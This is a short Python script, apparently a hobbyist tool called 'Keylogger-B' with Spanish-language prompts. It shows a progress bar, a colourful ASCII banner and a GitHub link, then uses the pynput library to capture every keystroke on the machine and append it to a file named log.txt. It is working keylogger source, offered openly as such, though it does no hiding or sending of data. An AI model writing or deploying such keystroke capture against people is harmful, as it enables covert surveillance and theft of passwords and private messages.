from colorama import init, Fore
import os
from tqdm import tqdm
from pynput.keyboard import Listener

os.system("clear")
print("\n")
loop = tqdm(total=10000, position=0, leave=False)
for k in range(10000):
    loop.set_description(Fore.LIGHTRED_EX + 'Opening Script'.format(k))
    loop.update(1)
loop.close()

print(f'''
{Fore.LIGHTMAGENTA_EX}   __ __         __                           ___ 
{Fore.LIGHTBLUE_EX}  / //_/__ __ __/ /__  ___ ____ ____ ________/ _ )
{Fore.LIGHTCYAN_EX} / ,< / -_) // / / _ \/ _ `/ _ `/ -_) __/___/ _  |
{Fore.LIGHTRED_EX}/_/|_|\__/\_, /_/\___/\_, /\_, /\__/_/     /____/ 
   V1.0  /___/       /___//___/  Autor: Balta     
                        {Fore.RESET} ________________________  
{Fore.LIGHTBLACK_EX}▐▓█▀▀▀▀▀▀▀▀▀█▓▌  {Fore.RESET}| Para ver todo lo       |
{Fore.LIGHTBLACK_EX}▐▓█   {Fore.RESET}▀   ▀▄{Fore.LIGHTBLACK_EX}   █▓▌  {Fore.RESET}| que escribió Consultar | 
{Fore.LIGHTBLACK_EX}▐▓█   {Fore.RESET}▄   ▄▀{Fore.LIGHTBLACK_EX}   █▓▌  {Fore.RESET}| el archivo log.txt     | 
{Fore.LIGHTBLACK_EX}▐▓█▄▄▄▄▄▄▄▄▄█▓▌  {Fore.RESET}|________________________| 
{Fore.LIGHTBLACK_EX}      ▄▄███▄▄            ''')
print(Fore.LIGHTBLUE_EX + "         h", end="")
print(Fore.LIGHTBLACK_EX + "t", end="")
print(Fore.LIGHTCYAN_EX + "t", end="")
print(Fore.LIGHTRED_EX + "p", end="")
print(Fore.LIGHTYELLOW_EX + "s", end="")
print(Fore.LIGHTGREEN_EX + ":", end="")
print(Fore.LIGHTWHITE_EX + "/", end="")
print(Fore.LIGHTBLUE_EX + "/", end="")
print(Fore.LIGHTBLACK_EX + "g", end="")
print(Fore.LIGHTCYAN_EX + "i", end="")
print(Fore.LIGHTRED_EX + "t", end="")
print(Fore.LIGHTYELLOW_EX + "h", end="")
print(Fore.LIGHTBLACK_EX + "u", end="")
print(Fore.LIGHTCYAN_EX + "b", end="")
print(Fore.LIGHTRED_EX + ".", end="")
print(Fore.LIGHTYELLOW_EX + "c", end="")
print(Fore.LIGHTGREEN_EX + "o", end="")
print(Fore.LIGHTBLACK_EX + "m", end="")
print(Fore.LIGHTWHITE_EX + "/", end="")
print(Fore.LIGHTBLUE_EX + "B", end="")
print(Fore.LIGHTBLACK_EX + "a", end="")
print(Fore.LIGHTCYAN_EX + "l", end="")
print(Fore.LIGHTRED_EX + "t", end="")
print(Fore.LIGHTYELLOW_EX + "a", end="")
print(Fore.LIGHTBLUE_EX + "-", end="")
print(Fore.LIGHTBLACK_EX + "P", end="")
print(Fore.LIGHTCYAN_EX + "y", end="")
print(Fore.LIGHTRED_EX + "t", end="")
print(Fore.LIGHTYELLOW_EX + "h", end="")
print(Fore.LIGHTGREEN_EX + "o", end="")
print(Fore.LIGHTWHITE_EX + "n\n")
print(Fore.RESET + ">>>", end="")

print(Fore.LIGHTRED_EX + " Enter para guardar: ")

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()